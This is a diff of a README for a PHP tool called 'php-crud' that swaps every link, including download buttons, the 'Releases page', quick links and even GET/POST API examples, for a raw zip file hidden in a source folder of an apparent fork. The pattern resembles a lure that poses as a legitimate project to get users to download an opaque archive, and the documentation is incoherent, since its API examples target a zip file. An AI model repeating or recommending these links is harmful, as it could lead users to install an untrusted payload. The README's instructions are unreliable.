@@ -4,7 +4,7 @@
 Welcome to php-crud! This application helps you easily add a REST API to your SQL database. Whether you're managing a MySQL, SQLite, or SQL Server database, php-crud simplifies the process. No coding skills needed!
 
 ## 📥 Download php-crud
-[![Download php-crud](https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip%20Release-blue)](https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip)
+[![Download php-crud](https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip%20Release-blue)](https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip)
 
 ## 📋 System Requirements
 To run php-crud, you need:
@@ -21,7 +21,7 @@ To run php-crud, you need:
 - **Geospatial Support:** Handle location-based data seamlessly.
 
 ## 💾 Download & Install
-To get started with php-crud, visit the [Releases page](https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip) to download the latest version. Follow these simple steps:
+To get started with php-crud, visit the [Releases page](https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip) to download the latest version. Follow these simple steps:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of php-crud.
@@ -30,7 +30,7 @@ To get started with php-crud, visit the [Releases page](https://raw.githubuserco
 5. Upload the single PHP file to your web server. You can use FTP software for this step.
 
 ## 🔗 Quick Links
-- [Releases page](https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip)
+- [Releases page](https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip)
 - [Documentation](#) (Placeholder for future documentation link).
 
 ## 🏗 Setting Up Your Database
@@ -43,17 +43,17 @@ After installing php-crud, you need to set up your database.
 ## 📱 Using php-crud
 Once php-crud is installed and your database is set up, you can start using it. Here’s how:
 
-- **Access the API:** Visit the URL where you uploaded the PHP file. For example, `https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip`.
+- **Access the API:** Visit the URL where you uploaded the PHP file. For example, `https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip`.
 - **Send Requests:** You can now use tools like Postman or your browser to make API requests.
 
 ### Example API Requests
 - **Get Data:** 
    ```
-   GET https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip
+   GET https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip
    ```
 - **Add Data:**
    ```
-   POST https://raw.githubusercontent.com/chrpnr/php-crud/main/coastwards/php-crud.zip
+   POST https://raw.githubusercontent.com/chrpnr/php-crud/main/src/Tqdev/PhpCrudApi/crud-php-1.3.zip
    ```
 
 ## ⚖ License
